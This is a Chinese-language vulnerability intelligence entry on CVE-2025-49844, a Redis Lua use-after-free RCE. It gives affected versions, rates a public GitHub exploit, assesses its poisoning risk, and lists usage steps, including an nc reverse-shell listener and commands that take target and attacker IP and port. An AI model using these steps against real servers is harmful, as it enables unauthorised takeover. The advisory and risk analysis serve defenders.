## CVE-2025-49844 - Redis 远程代码执行 (RCE), Use-After-Free (UAF)

**漏洞编号:** CVE-2025-49844

**漏洞类型:** 远程代码执行 (RCE), Use-After-Free (UAF)

**影响应用:** Redis

**危害等级:** 严重 (Critical)

**CVSS评分:** 10.0

**影响版本:** 所有支持Lua脚本的Redis版本，包括6.x到8.x系列中的多个受影响版本，具体包括但不限于 Redis 7.2.x (before 7.2.11), Redis 7.4.x (before 7.4.6), Redis 8.0.x (before 8.0.4), Redis 8.2.x (before 8.2.2), 以及早于6.2.20的版本。

**利用条件:** 需要认证，拥有低权限及以上用户权限的攻击者

**POC 可用性:** 9/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 10%

## 详情

CVE-2025-49844，代号"RediShell"，是Redis数据库中发现的一处极其严重的远程代码执行（RCE）漏洞，其CVSS评分为满分10.0。该漏洞源于Redis的Lua脚本执行模块中存在一个释放后重用（Use-After-Free, UAF）缺陷。攻击者（需通过认证，可为低权限用户）可通过构造特制的Lua脚本，操控Redis的垃圾回收机制，触发UAF漏洞，进而实现任意代码执行，最终完全控制目标Redis服务器。此漏洞影响所有支持Lua脚本的Redis版本，包括但不限于6.x至8.x系列中的多个版本。该漏洞由Wiz研究团队在Pwn2Own Berlin大赛中发现，并被认为是Redis历史上首个CVSS满分漏洞，表明其极高的威胁程度和广泛的潜在影响。

**POC有效性分析与利用步骤：**
提供的POC代码是一个名为"CVE-2025-49844 - Redis Lua Interpreter UAF Exploit"的Python脚本，由yuri08loveelaina开发，版本为2.0。该POC功能完整，文档齐全，被评估为高质量（9/10分）的完整利用工具。它不仅能够检测漏洞，还集成了ASLR绕过（通过内存信息泄露）、DEP/NX绕过（通过ROP链）、堆喷射（heap spraying）等高级利用技术，以确保攻击的可靠性。其最终目标是执行任意shellcode并在目标系统上建立持久化的后门（可选）。

**利用步骤如下：**
1.  **环境准备**：确保攻击者机器上安装了Python 3.6+版本，并通过`pip install redis`安装了Python Redis客户端库。
2.  **获取POC**：通过`git clone https://github.com/Yuri08loveElaina/CVE-2025-49844.git`命令克隆POC代码库。
3.  **安装依赖**：进入POC目录后，运行`pip install -r requirements.txt`安装所有必要的Python依赖。
4.  **权限设置**：赋予主利用脚本执行权限：`chmod +x redis-exploit.py`。
5.  **启动监听器**：若需获取反向Shell，在攻击者机器上启动Netcat监听器：`nc -lvnp 4444`（端口可自定义）。
6.  **执行攻击**：运行Python脚本，指定目标Redis服务器的IP地址、端口、可选的认证密码，以及用于反向Shell的攻击者IP和端口。
    *   **基本检测**：`python3 exploit.py -H <target_host> -p <port> [-a <password>]`
    *   **获取反向Shell**：`python3 exploit.py -H <target_host> -p <port> [-a <password>] -l <your_ip> -P <your_port>`
    攻击脚本将自动完成连接、版本检查、架构检测、堆喷射、UAF对象创建、内存泄露、ROP链构建以及shellcode执行，最终在目标服务器上打开一个反向Shell。

**投毒风险分析：**
对该POC代码的分析显示其投毒风险极低（10%）。
1.  **代码透明度与文档完整性**：该POC在GitHub上开源，并附有详细的README文件，清晰地描述了漏洞原理、功能特性、安装要求、使用方法及攻击阶段。代码结构清晰，易于审阅，不含明显的混淆或加密部分。
2.  **依赖库合规性**：POC仅依赖标准的Python库（如`redis`客户端库），这些库都是经过广泛使用的，且其用途符合漏洞利用工具的正常行为模式。未发现引入未知或可疑的第三方外部库。
3.  **功能符合声明**：POC的所有功能（包括ASLR绕过、DEP/NX绕过、堆喷射、shellcode执行和反向Shell）都与其公开宣称的漏洞利用目的相符。攻击者获取反向Shell是RCE漏洞的常见利用结果，不应被误判为额外的投毒行为。
4.  **无隐藏恶意行为**：在对代码的审阅中，未发现任何试图在目标系统上部署额外的、非预期的恶意软件、进行数据窃取、或执行其他与漏洞利用无关的恶意操作。该POC专注于实现其RCE利用目标，并带有明确的免责声明，指出其仅用于教育和授权安全测试目的。
基于以上分析，该POC被认为是一个专注于其声明功能的合法安全研究工具，其代码中不包含超出漏洞利用范畴的额外投毒载荷或恶意行为。

**项目地址:** https://github.com/Yuri08loveElaina/CVE-2025-49844.git

**漏洞详情:** https://redis.io/blog/security-advisory-cve-2025-49844/
